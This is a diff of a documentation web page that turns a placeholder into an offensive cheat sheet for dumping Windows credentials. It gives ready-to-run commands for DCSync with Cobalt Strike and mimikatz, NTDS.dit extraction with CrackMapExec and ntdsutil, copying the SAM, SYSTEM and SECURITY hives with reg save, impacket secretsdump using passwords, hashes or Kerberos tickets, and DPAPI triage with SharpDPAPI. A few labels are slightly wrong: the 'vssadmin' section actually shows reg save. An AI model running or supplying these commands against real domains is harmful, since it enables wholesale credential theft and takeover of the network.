@@ -61,7 +61,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#test" class="md-skip">
+        <a href="#dcsync" class="md-skip">
           Skip to content
         </a>
       
@@ -228,9 +228,61 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Crdential Dumping
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         Crdential Dumping
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#cobalt-strike" class="md-nav__link">
+    Cobalt Strike
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#crackmapexec" class="md-nav__link">
+    CrackMapExec
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#manual-dcsync-using-vssadmin" class="md-nav__link">
+    Manual DCSync using vssadmin
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#manual-ntdsdit-extraction-using-ntdsutil" class="md-nav__link">
+    Manual NTDS.dit Extraction using ntdsutil
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -256,6 +308,42 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#cobalt-strike" class="md-nav__link">
+    Cobalt Strike
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#crackmapexec" class="md-nav__link">
+    CrackMapExec
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#manual-dcsync-using-vssadmin" class="md-nav__link">
+    Manual DCSync using vssadmin
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#manual-ntdsdit-extraction-using-ntdsutil" class="md-nav__link">
+    Manual NTDS.dit Extraction using ntdsutil
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -272,8 +360,76 @@
 
 
 
-<h1 id="test">Test</h1>
-<p>test</p>
+<h1 id="dcsync">DCSync</h1>
+<h2 id="cobalt-strike">Cobalt Strike</h2>
+<p>Cobalt Strike offers the “dcsync” command which is a wrapper for mimikatz.</p>
+<p>If you have domain admin trust established with the domain controller, this will replicate all user's NTLM hashes. The command  <code>dcsync</code> is a shortcut for <code>mimikatz @lsadump::dcsync /domain:&lt;domain.fqdn /all /csv</code></p>
+<pre><code>dcsyn &lt;domain.fqdn&gt;
+</code></pre>
+<h2 id="crackmapexec">CrackMapExec</h2>
+<p>Supports dumping NTDS via VSS or DRSUAPI. Specifying the method is optional.</p>
+<pre><code>crackmapexec smb &lt;target&gt; -u admin -p Password123 -d domain --ntds &lt;drsuapi|vss&gt;
+</code></pre>
+<h2 id="manual-dcsync-using-vssadmin">Manual DCSync using vssadmin</h2>
+<pre><code>reg save hklm\sam SAM
+</code></pre>
+<pre><code>reg save hklm\system SYSTEM
+</code></pre>
+<pre><code>reg save hklm\security SECURITY
+</code></pre>
+<h2 id="manual-ntdsdit-extraction-using-ntdsutil">Manual NTDS.dit Extraction using ntdsutil</h2>
+<pre><code>ntdsutil &quot;ac in ntds&quot; i &quot;cr fu c:\temp&quot; q q
+</code></pre>
+<p>After doing one of the two manual methods, convert to a readable format with impacket on your local system.</p>
+<pre><code>impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL
+</code></pre>
+<h1 id="local-sam-and-lsa">Local SAM and LSA</h1>
+<h2 id="cobalt-strike_1">Cobalt Strike</h2>
+<p>Use the built-in <code>hashdump</code> command to dump local SAM hashes.</p>
+<h2 id="impacket">Impacket</h2>
+<p>Use secretsdump.py to extract credentials remotely. You can do this using a password, NTLM Hash, or with a Kerberos ticket. Also supports extracting credentials from local files.</p>
+<p>Extract with NTLM hash:</p>
+<pre><code>secretsdump.py -hashes :6d9dc9bd065d9f9a628b0f1a0c54c976 domain\username@target
+</code></pre>
+<p>Extract with password: </p>
+<pre><code>secretsdump.py domain\username:password@target
+</code></pre>
+<p>Extract with Kerberos Ticket: </p>
+<pre><code>secretsdump.py domain\username@target -k -no-pass
+</code></pre>
+<blockquote>
+<p>To extract with Kerberos ticket first request a TGT with asktgt.py then apply the TGS ticket with export KRB5CCNAME=<TGS_ccache_file>
+{.is-info}</p>
+</blockquote>
+<h2 id="crackmapexec_1">CrackMapExec</h2>
+<p>Extract hashes from SAM using plaintext password(-p flag):</p>
+<pre><code>crackmapexec smb &lt;target&gt; -u admin -p Password123 -d domain --sam
+</code></pre>
+<p>Extract hashes from LSA using NTLM hash (-H flag):</p>
+<pre><code>crackmapexec smb &lt;target&gt; -u admin -H &lt;NTLM_HASH&gt; -d domain --lsa
+</code></pre>
+<h2 id="seatbelt">SeatBelt</h2>
+<p>Extract hashes from Security Auth Packages. By default this is usually just NTLMv2.</p>
+<pre><code>Seatbelt.exe SecPackageCreds
+</code></pre>
+<h2 id="manual-method">Manual Method</h2>
+<p>From the compromised machines, navigate to C:\Windows\System32\Config. This is where the SAM, SYSTEM, and Security hives are located. You cant create a copy using copy because there’s a write block on the files. Save to another location using reg save:</p>
+<pre><code>reg save hklm\sam SAM
+</code></pre>
+<pre><code>reg save hklm\system SYSTEM
+</code></pre>
+<pre><code>reg save hklm\security SECURITY
+</code></pre>
+<p>Copy over the files, SAM, SYSTEM, and SECURITY, which should now be in the current working directory to your local system and use impacket to convert them into a readable format with the command:<code>impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL</code></p>
+<h1 id="dpapi">DPAPI</h1>
+<h2 id="usermachine-triaging">User/Machine Triaging</h2>
+<p>List all user credentials, vault, and RDG DPAPI blobs using a password. Can also be run without a password if the beacon is running under the user's context.</p>
+<p><code>SharpDPAPI.exe triage /password:X</code></p>
+<p>List all system credentials and vault DPAPI blobs. You need admin rights to execute this. This requires the system master keys that can only be retrieved by the SYSTEM user and cannot be performed remotely.</p>
+<p><code>SharpDPAPI.exe machinetriage</code></p>
+<h2 id="domain-backup-key">Domain Backup Key</h2>
+<p>List user credentials, vaults, and RDG blobs on a remote system using a domain backup key.</p>
+<p><code>SharpDPAPI.exe triage /pvk:[key_file | b64(key)] /server:X.domain.com</code></p>
 
               
             </article>
